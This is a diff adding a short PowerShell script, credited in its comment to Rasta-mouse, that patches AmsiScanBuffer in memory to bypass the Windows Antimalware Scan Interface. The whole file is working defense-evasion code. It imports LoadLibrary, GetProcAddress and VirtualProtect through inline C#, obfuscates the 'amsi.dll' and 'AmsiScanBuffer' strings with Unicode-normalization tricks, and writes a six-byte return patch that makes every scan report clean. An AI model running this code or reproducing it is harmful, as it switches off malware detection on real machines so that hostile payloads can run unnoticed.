@@ -1,0 +1,28 @@
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$pmnzv = @"
+using System;
+using System.Runtime.InteropServices;
+public class pmnzv {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr tahzln, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $pmnzv
+
+$kcnotif = [pmnzv]::LoadLibrary("$(('ám'+'sì'+'.d'+'ll').nOrMalize([ChAR]([bytE]0x46)+[CHAR]([ByTE]0x6f)+[char](114*77/77)+[Char]([bytE]0x6d)+[ChAR](30+38)) -replace [ChAR]([bYte]0x5c)+[ChaR]([byte]0x70)+[ChAR]([BytE]0x7b)+[chAr](77+18-18)+[cHAr](110+81-81)+[ChAR](125+103-103))")
+$psiwgf = [pmnzv]::GetProcAddress($kcnotif, "$(('ÃmsîSc'+'ânBuff'+'er').NorMaliZe([cHAR](28+42)+[cHAr](111)+[CHAR](114+10-10)+[CHar]([ByTe]0x6d)+[ChaR](68)) -replace [CHaR]([byTE]0x5c)+[ChaR](92+20)+[char](46+77)+[ChAR](11+66)+[CHAR](110)+[cHAr](125*52/52))")
+$p = 0
+[pmnzv]::VirtualProtect($psiwgf, [uint32]5, 0x40, [ref]$p)
+$xcez = "0xB8"
+$wapg = "0x57"
+$fpxc = "0x00"
+$szjf = "0x07"
+$hmcm = "0x80"
+$vtin = "0xC3"
+$jhmae = [Byte[]] ($xcez,$wapg,$fpxc,$szjf,+$hmcm,+$vtin)
+[System.Runtime.InteropServices.Marshal]::Copy($jhmae, 0, $psiwgf, 6)
